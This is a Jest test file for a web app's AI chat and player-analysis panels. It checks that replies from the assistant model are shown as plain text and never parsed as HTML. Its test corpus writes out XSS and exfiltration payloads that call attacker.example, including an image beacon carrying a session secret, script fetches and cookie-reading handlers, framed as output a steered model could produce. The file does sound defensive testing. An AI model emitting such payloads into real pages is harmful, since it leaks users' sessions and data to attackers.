/**
 * Model text is untrusted input. These tests pin that the assistant screens draw
 * it as nodes and never hand it to the browser's HTML parser.
 *
 * Before this fix, ARIA's chat (addAIMsg) and the player analysis panel
 * (loadPlayerAIAnalysis) wrote the reply into innerHTML after turning \n into
 * <br> and **x** into <strong>. A reply containing <img src="https://…/?d=…">
 * therefore became a live image request, which the image policy (img-src https:)
 * allows: a data-exfiltration path that needs no script at all.
 *
 * The tests run the real public/ai-model-text.js and the real addAIMsg and
 * loadPlayerAIAnalysis taken out of public/app.js, against a small recording
 * document whose innerHTML is a tripwire. Controls prove that the corpus is
 * dangerous under the old transform and that the tripwire catches an HTML write.
 */
import * as fs from 'fs';
import * as path from 'path';
import * as vm from 'vm';

const ROOT = path.join(__dirname, '..');
const read = (p: string) => fs.readFileSync(path.join(ROOT, p), 'utf8');
const stripComments = (src: string) => src.replace(/\/\*[\s\S]*?\*\//g, '').split('\n').map((l) => l.replace(/^\s*\/\/.*$/, '')).join('\n');

const MT = require('../public/ai-model-text.js');

// ── A recording document ─────────────────────────────────────────────────────
// Elements keep real child lists so text can be read back. innerHTML records
// every write (and throws when strict), so a test can say exactly what reached
// the parser. Nothing here parses markup.
type FakeNode = any;
function makeDoc(opts: { strictHTML: boolean }) {
  const htmlWrites: string[] = [];
  const created: string[] = [];
  const attrs: string[] = [];
  const doc: any = {};
  function node(kind: 'el' | 'text' | 'frag', tag?: string, value?: string): FakeNode {
    const n: FakeNode = { kind, tagName: tag ? tag.toUpperCase() : undefined, childNodes: [] as FakeNode[], parentNode: null, ownerDocument: doc, className: '', value };
    Object.defineProperty(n, 'firstChild', { get: () => n.childNodes[0] || null });
    Object.defineProperty(n, 'textContent', {
      get: () => (n.kind === 'text' ? n.value : n.childNodes.map((c: FakeNode) => c.textContent).join('')),
      set: (v: string) => { n.childNodes = [node('text', undefined, String(v))]; },
    });
    Object.defineProperty(n, 'innerHTML', {
      get: () => { throw new Error('innerHTML read'); },
      set: (v: string) => {
        htmlWrites.push(String(v));
        if (opts.strictHTML) throw new Error('innerHTML write: ' + String(v).slice(0, 80));
        n.childNodes = [];
        // Static templates carry one empty [data-ai-text] slot, which is all the
        // call sites look up.
        if (/data-ai-text/.test(String(v))) { const slot = node('el', 'div'); slot.isSlot = true; n.childNodes.push(slot); slot.parentNode = n; }
      },
    });
    n.outerHTML = undefined;
    Object.defineProperty(n, 'outerHTML', { set: () => { throw new Error('outerHTML write'); }, get: () => '' });
    n.insertAdjacentHTML = () => { throw new Error('insertAdjacentHTML'); };
    n.setAttribute = (a: string) => { attrs.push(a); };
    n.appendChild = (c: FakeNode) => {
      if (c.kind === 'frag') { c.childNodes.forEach((k: FakeNode) => { k.parentNode = n; n.childNodes.push(k); }); c.childNodes = []; return c; }
      c.parentNode = n; n.childNodes.push(c); return c;
    };
    n.removeChild = (c: FakeNode) => { n.childNodes = n.childNodes.filter((k: FakeNode) => k !== c); c.parentNode = null; return c; };
    n.querySelector = (sel: string) => {
      if (sel !== '[data-ai-text]') throw new Error('unexpected selector ' + sel);
      const walk = (x: FakeNode): FakeNode => { if (x.isSlot) return x; for (const k of x.childNodes) { const f = walk(k); if (f) return f; } return null; };
      return walk(n);
    };
    return n;
  }
  doc.createElement = (t: string) => { created.push(t.toLowerCase()); return node('el', t); };
  doc.createTextNode = (v: string) => node('text', undefined, String(v));
  doc.createDocumentFragment = () => node('frag');
  doc.byId = {} as Record<string, FakeNode>;
  doc.getElementById = (id: string) => doc.byId[id] || null;
  return { doc, htmlWrites, created, attrs, node };
}

// Every element under a node, as lower-case tag names.
function tags(n: FakeNode): string[] {
  const out: string[] = [];
  const walk = (x: FakeNode) => { for (const k of x.childNodes) { if (k.kind === 'el') out.push(k.tagName.toLowerCase()); walk(k); } };
  walk(n);
  return out;
}

// What a reader would see: the text with the bold markers gone and each line on its own.
function visible(n: FakeNode): string {
  const parts: string[] = [];
  const walk = (x: FakeNode) => { for (const k of x.childNodes) { if (k.kind === 'text') parts.push(k.value); else if (k.tagName === 'BR') parts.push('\n'); else walk(k); } };
  walk(n);
  return parts.join('');
}

// ── The corpus ───────────────────────────────────────────────────────────────
// Each entry is something a steered model could write. `marker` is the
// substring that would be live markup if the reply reached the parser.
const EXFIL = 'Squad looks fine.\n<img src="https://attacker.example/c?d=SESSION_SECRET">';
const CORPUS: Array<{ name: string; text: string; marker: string }> = [
  { name: 'image beacon (img-src https: allows the request)', text: EXFIL, marker: '<img' },
  { name: 'image beacon inside **bold**', text: '**<img src=https://attacker.example/b?d=1>**', marker: '<img' },
  { name: 'script element', text: 'Hi <script>fetch("https://attacker.example/s")</script>', marker: '<script' },
  { name: 'event handler', text: '<svg onload="alert(1)"><circle r="1"/></svg>', marker: 'onload=' },
  { name: 'error handler on a broken image', text: '<img src=x onerror=alert(document.cookie)>', marker: 'onerror=' },
  { name: 'javascript: link', text: '<a href="javascript:alert(1)">open report</a>', marker: '<a ' },
  { name: 'frame with srcdoc', text: '<iframe srcdoc="<script>alert(1)</script>"></iframe>', marker: '<iframe' },
  { name: 'stylesheet import beacon', text: '<style>@import url(https://attacker.example/css?d=1)</style>', marker: '<style' },
  { name: 'meta refresh redirect', text: '<meta http-equiv="refresh" content="0;url=https://attacker.example/">', marker: '<meta' },
  { name: 'form posting elsewhere', text: '<form action="https://attacker.example/p"><input name=pw></form>', marker: '<form' },
  { name: 'markup split across a line break', text: '<img\nsrc=https://attacker.example/n>', marker: '<img' },
  { name: 'markdown image (never an element)', text: '![chart](https://attacker.example/m?d=1)', marker: '' },
  { name: 'entity-encoded markup stays encoded', text: '&lt;img src=x&gt; &amp; &#60;b&#62;', marker: '' },
];

// The transform addAIMsg used before this fix, kept here as the control.
const OLD_ARIA = (text: string) => text.replace(/\n/g, '<br>').replace(/\*\*(.*?)\*\*/g, '<strong style="color:var(--tx);">$1</strong>');

describe('model text renderer (public/ai-model-text.js)', () => {
  it('keeps the formatting the screens have always shown: line breaks and **bold**', () => {
    expect(MT.parse('Plan:\n**Rest** Silva and **rotate** the back four.\nThat is all.')).toEqual([
      [{ text: 'Plan:', bold: false }],
      [{ text: 'Rest', bold: true }, { text: ' Silva and ', bold: false }, { text: 'rotate', bold: true }, { text: ' the back four.', bold: false }],
      [{ text: 'That is all.', bold: false }],
    ]);
    expect(MT.parse('a\r\nb\rc')).toEqual([[{ text: 'a', bold: false }], [{ text: 'b', bold: false }], [{ text: 'c', bold: false }]]);
    expect(MT.parse('2 ** 3 is 8')).toEqual([[{ text: '2 ** 3 is 8', bold: false }]]);
    expect(MT.parse('')).toEqual([[]]);
    expect(MT.parse(null)).toEqual([[]]);
    expect(MT.parse(undefined)).toEqual([[]]);
    expect(MT.parse(42)).toEqual([[{ text: '42', bold: false }]]);
  });

  it('draws a reply as text, <br> and <strong> only, with a class and no attributes or inline style', () => {
    const { doc, htmlWrites, created, attrs } = makeDoc({ strictHTML: true });
    const box = doc.createElement('div'); created.length = 0;
    MT.render(box, 'One\n**Two** three', doc);
    expect(created).toEqual(['br', 'strong']);
    expect(tags(box)).toEqual(['br', 'strong']);
    expect(box.childNodes[2].className).toBe(MT.BOLD_CLASS);
    expect(visible(box)).toBe('One\nTwo three');
    expect(attrs).toEqual([]);
    expect(htmlWrites).toEqual([]);
  });

  it('replaces what the container showed before, rather than appending to it', () => {
    const { doc } = makeDoc({ strictHTML: true });
    const box = doc.createElement('div');
    MT.render(box, 'first', doc);
    MT.render(box, 'second', doc);
    expect(visible(box)).toBe('second');
  });

  describe.each(CORPUS)('negative: $name', ({ text, marker }) => {
    it('becomes visible characters, never an element, attribute or HTML write', () => {
      const { doc, htmlWrites, attrs } = makeDoc({ strictHTML: true });
      const box = doc.createElement('div');
      MT.render(box, text, doc);
      expect(htmlWrites).toEqual([]);
      expect(attrs).toEqual([]);
      expect(tags(box).every((t) => t === 'br' || t === 'strong')).toBe(true);
      expect(visible(box)).toBe(text.replace(/\r\n?/g, '\n').replace(/\*\*(.*?)\*\*/g, '$1'));
      if (marker) expect(visible(box)).toContain(marker);
    });
  });

  it('(control) the corpus is live markup under the transform addAIMsg used before', () => {
    // If this stops holding, the corpus no longer exercises the hole it pins.
    for (const { text, marker } of CORPUS) {
      if (marker) expect(OLD_ARIA(text)).toContain(marker);
    }
    expect(OLD_ARIA(EXFIL)).toContain('<br><img src="https://attacker.example/c?d=SESSION_SECRET">');
  });

  it('(control) the recording document catches an HTML write', () => {
    const { doc, htmlWrites } = makeDoc({ strictHTML: true });
    const box = doc.createElement('div');
    expect(() => { box.innerHTML = OLD_ARIA(EXFIL); }).toThrow(/innerHTML write/);
    expect(() => box.insertAdjacentHTML('beforeend', EXFIL)).toThrow(/insertAdjacentHTML/);
    expect(htmlWrites).toHaveLength(1);
  });

  it('has no way to reach the browser’s parser, an attribute, a style, eval or the network', () => {
    const src = stripComments(read('public/ai-model-text.js'));
    expect(src).not.toMatch(/\binnerHTML\b|outerHTML|insertAdjacentHTML|DOMParser|createContextualFragment|document\.write|<template|\beval\(|new Function\(|\bFunction\(|srcdoc/);
    expect(src).not.toMatch(/setAttribute|\.style\b|\bfetch\(|XMLHttpRequest|sendBeacon|WebSocket|\bimport\(|\brequire\(/);
  });

  it('attaches itself to the page when loaded by a script tag', () => {
    const ctx: any = {};
    vm.runInNewContext(read('public/ai-model-text.js'), ctx);
    expect(typeof ctx.FamilistaModelText.render).toBe('function');
    expect(ctx.FamilistaModelText.BOLD_CLASS).toBe('ai-text-strong');
  });
});

// ── The real call sites, taken out of public/app.js ─────────────────────────
const APP = read('public/app.js');
function fnSource(name: string): string {
  const re = new RegExp('^(async )?function ' + name + '\\(', 'm');
  const m = re.exec(APP);
  if (!m) throw new Error(name + ' not found in public/app.js');
  const end = APP.indexOf('\n}\n', m.index);
  return APP.slice(m.index, end + 2);
}

describe('ARIA chat (addAIMsg)', () => {
  function run(text: string, role: string) {
    const env = makeDoc({ strictHTML: true });
    const box = env.node('el', 'div');
    env.doc.byId['ai-msgs'] = box;
    const ctx: any = { document: env.doc, FamilistaModelText: MT };
    vm.runInNewContext(fnSource('addAIMsg') + ';addAIMsg(__text, __role);', Object.assign(ctx, { __text: text, __role: role }));
    return { box, msg: box.childNodes[0], ...env };
  }

  it.each(CORPUS)('negative: $name from the model is shown as text', ({ text }) => {
    const { msg, htmlWrites, attrs } = run(text, 'ai');
    expect(htmlWrites).toEqual([]);
    expect(attrs).toEqual([]);
    const bubble = msg.childNodes[1];
    expect(bubble.className).toBe('ai-msg-bubble ai');
    expect(tags(bubble).every((t) => t === 'br' || t === 'strong')).toBe(true);
    expect(visible(bubble)).toBe(text.replace(/\*\*(.*?)\*\*/g, '$1'));
  });

  it('negative: the question the user typed is shown as text too', () => {
    const { msg, htmlWrites } = run('<img src=https://attacker.example/u>', 'user');
    expect(htmlWrites).toEqual([]);
    expect(msg.className).toBe('ai-msg user');
    expect(msg.childNodes[0].className).toBe('ai-msg-av ai-msg-av-user');
    expect(msg.childNodes[0].textContent).toBe('K');
    expect(visible(msg.childNodes[1])).toBe('<img src=https://attacker.example/u>');
  });

  it('keeps the message layout: avatar, then a bubble with line breaks and bold', () => {
    const { box, msg } = run('Top 3:\n**Press** higher', 'ai');
    expect(box.childNodes).toHaveLength(1);
    expect(msg.className).toBe('ai-msg ai');
    expect(msg.childNodes[0].className).toBe('ai-msg-av ai-msg-av-aria');
    expect(msg.childNodes[0].textContent).toBe('⚡');
    expect(tags(msg.childNodes[1])).toEqual(['br', 'strong']);
    expect(visible(msg.childNodes[1])).toBe('Top 3:\nPress higher');
    expect(box.scrollTop).toBe(99999);
  });

  it('cannot put an unexpected role into a class name', () => {
    const { msg } = run('x', 'ai" onclick="alert(1)');
    expect(msg.className).toBe('ai-msg user');
  });

  it('has no HTML write left in its source', () => {
    const src = stripComments(fnSource('addAIMsg'));
    expect(src).not.toMatch(/innerHTML|insertAdjacentHTML|outerHTML/);
    expect(src).toContain('FamilistaModelText.render(bubble, text);');
  });
});

describe('player analysis panel (loadPlayerAIAnalysis)', () => {
  async function run(reply: { response?: unknown } | Error) {
    const env = makeDoc({ strictHTML: false });
    const el = env.node('el', 'div');
    env.doc.byId['ai-player-analysis'] = el;
    const api = async () => { if (reply instanceof Error) throw reply; return { data: reply }; };
    const ctx: any = { document: env.doc, FamilistaModelText: MT, api };
    vm.runInNewContext(fnSource('loadPlayerAIAnalysis') + ';__done = loadPlayerAIAnalysis("p-1");', ctx);
    await ctx.__done;
    return { el, ...env };
  }

  it.each(CORPUS)('negative: $name from the model never reaches innerHTML', async ({ text, marker }) => {
    const { el, htmlWrites } = await run({ response: text });
    // The loading state and the static header are written as HTML; the reply is not.
    expect(htmlWrites).toHaveLength(2);
    for (const w of htmlWrites) {
      expect(w).not.toContain(text);
      if (marker) expect(w).not.toContain(marker);
    }
    const slot = el.querySelector('[data-ai-text]');
    expect(tags(slot).every((t) => t === 'br' || t === 'strong')).toBe(true);
    expect(visible(slot)).toBe(text.replace(/\*\*(.*?)\*\*/g, '$1'));
  });

  it('keeps the header and shows each line of the reply on its own line', async () => {
    const { el, htmlWrites } = await run({ response: 'Strong in duels.\nWatch his load.' });
    expect(htmlWrites[1]).toContain('ARIA Analysis');
    expect(htmlWrites[1]).toContain('line-height:1.7;');
    expect(visible(el.querySelector('[data-ai-text]'))).toBe('Strong in duels.\nWatch his load.');
  });

  it('negative: an error message is shown as text, not markup', async () => {
    const { el, htmlWrites } = await run(new Error('<img src=https://attacker.example/e>'));
    expect(htmlWrites.join('')).not.toContain('<img');
    expect(el.querySelector('[data-ai-text]').textContent).toBe('Analysis failed — <img src=https://attacker.example/e>');
  });

  it('still says when there is no reply', async () => {
    const { htmlWrites } = await run({});
    expect(htmlWrites[1]).toContain('No AI response.');
  });

  it('writes only string literals into innerHTML', () => {
    const src = stripComments(fnSource('loadPlayerAIAnalysis'));
    // Each write is `innerHTML =` followed by quoted literals joined with +, then `;`.
    // Anything else after the = (a name, a call, a template) ends the run early.
    const writes = [...src.matchAll(/innerHTML\s*=((?:\s|\+|'[^'\n]*')*)([^\s+'])/g)];
    expect(src.match(/innerHTML/g)).toHaveLength(4);
    expect(writes).toHaveLength(4);
    for (const w of writes) expect(w[2]).toBe(';');
    expect(src).toContain("FamilistaModelText.render(el.querySelector('[data-ai-text]'), res.data.response);");
  });
});

describe('page wiring', () => {
  it('loads the renderer, same-origin and deferred, before app.js which calls it', () => {
    const html = read('public/index.html');
    const mt = html.indexOf('<script src="/ai-model-text.js?v=20261020-ai-safe-text" defer></script>');
    const app = html.indexOf('<script src="/app.js?v=20261022-agents-room" defer></script>');
    expect(mt).toBeGreaterThan(-1);
    expect(app).toBeGreaterThan(mt);
  });

  it('styles the bold run from app.css, as the inline style used to', () => {
    expect(read('public/app.css')).toContain('.ai-text-strong{color:var(--tx);}');
  });

  it('leaves the image and script policy as they were', () => {
    const app = read('src/app.ts');
    expect(app).toMatch(/scriptSrc:\s+\["'self'"\],/);
    expect(app).toMatch(/imgSrc:\s+\["'self'", 'data:', 'blob:', 'https:'\],/);
    expect(app).toMatch(/objectSrc:\s+\["'none'"\],/);
    expect(app).toMatch(/frameSrc:\s+\["'none'"\],/);
  });
});
